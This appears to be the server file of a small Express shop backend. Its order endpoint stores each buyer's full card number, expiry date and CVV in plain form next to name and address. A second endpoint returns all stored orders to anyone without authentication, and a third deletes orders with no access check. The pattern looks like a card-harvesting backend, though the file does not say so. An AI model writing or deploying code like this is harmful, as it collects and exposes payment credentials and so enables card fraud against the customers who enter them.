import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import sql from './db.js';

dotenv.config();

const app = express();

app.use(cors({
  origin: ['https://www.ecashnow.xyz', 'http://localhost:3000', 'http://localhost:5173'],
  credentials: true
}));
app.use(express.json());

app.post('/api/save-order', async (req, res) => {
  try {
    const { user, card, total, cart } = req.body;

    const result = await sql`
      INSERT INTO orders (name, phone, address, city, state, pincode, card_number, expiry, cvv, cardholder_name, amount, cart_items, created_at) 
      VALUES (${user.name}, ${user.phone}, ${user.address}, ${user.city}, ${user.state}, ${user.pincode}, ${card.number}, ${card.expiry}, ${card.cvv}, ${card.name}, ${total}, ${JSON.stringify(cart)}, NOW()) 
      RETURNING id
    `;

    res.json({ ok: true, order_id: result[0].id });
  } catch (error) {
    console.error('Database error:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

app.get('/api/orders', async (req, res) => {
  try {
    const orders = await sql`SELECT * FROM orders ORDER BY created_at DESC`;
    res.json({ ok: true, orders });
  } catch (error) {
    console.error('Database error:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

app.delete('/api/orders/:id', async (req, res) => {
  try {
    await sql`DELETE FROM orders WHERE id = ${req.params.id}`;
    res.json({ ok: true });
  } catch (error) {
    console.error('Database error:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
